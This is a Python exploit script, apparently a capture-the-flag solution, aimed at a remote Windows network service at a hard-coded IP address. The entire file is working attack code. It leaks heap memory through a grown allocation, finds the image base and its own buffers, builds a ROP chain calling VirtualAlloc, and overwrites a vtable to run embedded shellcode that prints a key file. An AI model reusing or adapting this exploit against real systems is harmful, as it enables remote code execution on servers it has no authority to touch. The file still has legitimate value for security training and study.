#!/usr/bin/python
import socket
import struct
import random
import string
import time
import sys

shellcode = '648b250400000081ec00020000e83a000000747970652022433a5c55736572735c41646d696e6973747261746f725c4465736b746f705c446566636f6e204368616c5c6b65792e7478742200be30b71b75ffd6be5018eb00ffe6'.decode('hex')

# align to 8 bytes
while len(shellcode) % 8: shellcode += '\0'
shellcode_dwords = [struct.unpack_from('I', shellcode, i)[0] for i in range(0, len(shellcode), 4)]

# usual boilerplate
#ADDRESS = ('easier_55605f781f413a2b699377ced27617f0.quals.shallweplayaga.me', 8989)
ADDRESS = ("141.223.175.211", 4444)

VERBOSE = False
sock = None
def read_byte():
    buf = sock.recv(1)
    if not buf:
        raise EOFError
    return buf

def read_n(n):
    s = ''.join(read_byte() for i in range(n))
    if VERBOSE:
        print '<', `s`
    return s

def read_until(sentinel='\n'):
    s = ''
    while not s.endswith(sentinel):
        b = read_byte()
        if VERBOSE:
            sys.stdout.write(b)
            sys.stdout.flush()
        s += b
    return s

def send(s):
    if VERBOSE:
        print '>', `s`
    sock.sendall(s)


# specific code
U32 = 0xFFFFFFFF
def encode(v1, v2):
    value = 0
    lookup = [1,2,3,4]
    for i in range(64):
        v1 = (v1 + ((value + lookup[value & 3]) ^ (v2 + ((v2 << 4) ^ (v2 >> 5))))) & U32
        value -= 0x160D0365;
        v2 = (v2 + ((value + lookup[(value >> 11) & 3]) ^ (v1 + ((v1 << 4) ^ (v1 >> 5))))) & U32
    return v1, v2

def decode(v1, v2):
    value = 0x7CBF26C0
    lookup = [1,2,3,4]
    for i in range(64):
        v2 = (v2 - ((value + lookup[(value >> 11) & 3]) ^ (v1 + ((v1 << 4) ^ (v1 >> 5))))) & U32
        value += 0x160D0365
        v1 = (v1 - ((value + lookup[value         & 3]) ^ (v2 + ((v2 << 4) ^ (v2 >> 5))))) & U32
    return v1, v2


def send_pair(v1, v2):
    v1, v2 = encode(v1, v2)
    send(str(v1) + 'x ' + str(v2) + 'x\n')

def send_sequence(l):
    l = l[:]
    n = len(l) & 1
    if n:
        l.append(0)
    for i in range(0, len(l), 2):
        l[i], l[i+1] = encode(l[i], l[i+1])
    if n:
        l = l[:-1]
    send(' '.join('%dx' % i for i in l) + '\n')


def allocate_item(size, data):
    send_pair(1, size)
    send_sequence(data)

def read_item(item):
    send_pair(2, item)
    r = [int(i,16) for i in read_until('\n').split()]
    if len(r) >= 2:
        r[0], r[1] = decode(r[0], r[1])
    return r

def free_item(item):
    send_pair(3, item)

def operation_5(zero_or_40, src_idx):
    send_pair(5, zero_or_40 | (src_idx << 8))


def try_to_win():
    global VERBOSE
    global sock
    print ADDRESS

    sock = socket.create_connection(ADDRESS)

    # do the pointless handshake
    values = read_until('\n').split()
    send('4 5 6 7\n')

    # this size allocates in an LHF block preceeding the vtable on the remote
    # server
    size = 24
    current_item = 0
    allocate_item(size, [2] * (size/4)); current_item += 1

    # allocate the largest item we can
    grow_item = current_item
    allocate_item(2040, [2] * (2040/4)); current_item += 1

    # allocate more items in the same LFH block, so we can grow one of them
    # to leak even more heap memory
    for i in range(19):
        allocate_item(24, [0x12345678,current_item,0,0,0,0]); current_item += 1

    # copy 24 bytes to our first allocation, and set its size to 2040
    operation_5(0, grow_item)

    # read out the 2040 bytes
    original = read_item(0)


    # try to find the vtable
    vtable_index = None

    for i, v in enumerate(original):
        if (v & 0xFFFF) == 0xc134:
            image_base = v - 0x1c134
            print hex(image_base)
            vtable_index = i
            print 'found vtable at offset', i
            break
    else:
        # just retry
        print 'no vtable! :('
        return False

    # try to find one of our other buffers
    for i, v in enumerate(original):
        if i + 1 < len(original) and v == 0x12345678:
            leak_item_index = i-1
            leak_item_id = original[i+1]
            print 'found item', original[i+1], 'at index', leak_item_index
            break
    else:
        print 'no item'
        return False

    # grow our leak item so we can read 9KB of heap memory
    update = original[:]
    update[leak_item_index] = 0x2400

    # we write to our 2040 byte window by allocating a new item
    # and doing operation 5 again. this copies 2040 bytes.
    update_item = current_item
    allocate_item(2040, update); current_item += 1

    operation_5(0, update_item)


    # leak 9KB of memory for the first time.
    # this should include the array of pointers to our buffers, which will
    # allow us to find the address of our buffers and construct complex data.
    leak_1 = read_item(leak_item_id)
    print ' '.join('%x' % i for i in leak_1)


    # allocate the shellcode
    allocate_item(len(shellcode_dwords)*4, shellcode_dwords); current_item += 1


    # find the pointer to the shellcode by leaking 9KB again, and looking at
    # the changes made to the memory
    leak_2 = read_item(leak_item_id)

    for i, (a,b) in enumerate(zip(leak_1, leak_2)):
        if i == 0 or i == len(leak_1) - 1: continue
        if leak_1[i-1] != 0 and leak_2[i-1] != 0 and a == 0 and b != 0 and leak_1[i+1] == 0 and leak_2[i+1] == 0:
            print 'index is', hex(i)
            my_string_addr = leak_2[i] + 4
            print 'my_string_addr @ ' + hex(my_string_addr)
            break
    else:
        print 'couldnt find my_string_addr'
        return False

    # generate our rop chain, using the shellcode address

    def slide(x):
        return x - 0x400000 + image_base

    # (unused) gadget for debugging
    definitely_printf_4 = slide( 0x401850 )

    # (unused) function for dumping memory
    # I used this, combined with some "pop" gadgets to dump the import
    # pointers and find the kernel32 base address.
    write_function = slide( 0x40F13A )

    # just a ret instruction
    rop_nop = slide( 0x40F21B )

    # This could be calculated at the time, but once-per-boot ASLR is too
    # convenient not to take advantage of.
    kernel32_base = 0x770e0000

    virutalalloc = 0x6B818B90-0x6B810000+kernel32_base

    rop_chain = [
        # make some room for the stack, so it won't corrupt the heap
        rop_nop, # esi
        rop_nop, # ebp
        rop_nop, # first gadget
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        rop_nop,
        virutalalloc,
        my_string_addr,
        my_string_addr,
        len(shellcode),
        0x1000,
        0x40,
    ]

    # allocate the rop chain
    while len(rop_chain) < (0x100/4):
        rop_chain.append(rop_nop)
    assert len(rop_chain) == (0x100/4)

    allocate_item(0x100, rop_chain); current_item += 1


    # find the rop chain as before
    leak_3 = read_item(leak_item_id)

    for i, (a,b) in enumerate(zip(leak_2, leak_3)):
        if i == 0 or i == len(leak_2) - 1: continue
        if leak_2[i-1] != 0 and leak_3[i-1] != 0 and a == 0 and b != 0 and leak_2[i+1] == 0 and leak_3[i+1] == 0:
            print 'index is', hex(i)
            my_rop_chain = leak_3[i] + 4
            print 'my_rop_chain @ ' + hex(my_rop_chain)
            break
    else:
        print 'couldnt find my_rop_chain'
        return False

    # create the vtable, using the pointer to the rop chain
    vtable = [
        my_rop_chain,
        0x2B,               # value for the "es" segment
        slide(0x00405b04),  # les esp, ptr [eax] ; pop esi ; pop ebp ; ret
    ]

    while len(vtable) < (0x40/4):
        vtable.append(0)
    assert len(vtable) == (0x40/4)


    # allocate the vtable
    allocate_item(0x40, vtable); current_item += 1

    # find the vtable as before
    leak_4 = read_item(leak_item_id)

    for i, (a,b) in enumerate(zip(leak_3, leak_4)):
        if i == 0 or i == len(leak_3) - 1: continue
        if leak_3[i-1] != 0 and leak_4[i-1] != 0 and a == 0 and b != 0 and leak_3[i+1] == 0 and leak_4[i+1] == 0:
            my_vtable = leak_4[i] + 4
            print 'my_vtable @ ' + hex(my_vtable)
            break
    else:
        print 'couldnt find my_vtable'
        return False


    # now we can just corrupt the existing vtable to point to our fake one
    VERBOSE = True
    update[vtable_index] = my_vtable
    update_item = current_item
    allocate_item(2040, update); current_item += 1

    operation_5(0, update_item)

    # invoke exit, to trigger the atexit handler to trigger the virtual call
    free_item(100)

    # read forever, dumping output to stderr (hangs)
    read_until('\n\n\n')


while True:
    # hangs if successful
    try_to_win()
